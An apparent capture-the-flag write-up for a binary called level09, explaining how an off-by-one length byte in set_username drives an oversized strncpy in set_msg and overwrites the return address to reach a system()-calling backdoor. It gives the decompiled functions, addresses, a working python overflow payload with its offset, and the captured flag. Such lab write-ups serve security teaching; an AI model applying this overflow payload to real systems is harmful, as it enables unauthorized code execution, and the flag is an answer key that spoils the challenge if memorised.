# level9

## Overview
In this binary, there are two user inputs. The first input determines the size of the content to be copied, and the second input is the content that gets copied to a specific address. We exploit a buffer overflow vulnerability to alter the control flow and execute our desired function.


## Steps
### secret_backdoor
```c
int secret_backdoor()
{
  char s[128]; // [rsp+0h] [rbp-80h] BYREF

  fgets(s, 128, stdin);
  return system(s);
}
```
```
0x55555555488c <secret_backdoor>
```
The function we want to execute.

### set_username
```
  fgets(s, 128, stdin);
  for ( i = 0; i <= 40 && s[i]; ++i )
    *(_BYTE *)(a1 + i + 140) = s[i];
```
1. It gets a line from input to address: `0x7fffffffe420` = `-0x90(%rbp)`
2. Then, copy 41 bytes to `a1+41`.

- 40 'a' characters
- 1 byte that sets the length for strncpy in set_msg (we can use 0xff to ensure a large copy)

### set_msg
```
  fgets(s, 1024, stdin);
  return strncpy((char *)a1, s, *(int *)(a1 + 180));
```
It gets a line from input to address: `0x7fffffffe0b0` = `-0x400(%rbp)`

### strncpy
dest: `0xffffe4c0`
src:  `s` from `fgets`
len:  41th character of input of `set_username`. It can be `255` bytes max.

I found offset by testing. It's 200.

## Payload
```
python -c 'print("a"*40 + "\xff\n" +"0a1a2a3a4a5a6a7a8a9a"*10 + "\x00\x00\x55\x55\x55\x55\x48\x8c"[::-1])' > /tmp/09
cat /tmp/09 - | ./level09
```

## Flag
```
j4AunAPDXaJxxWjYEUxpanmvSgRDV3tpA5BEaBuE
```
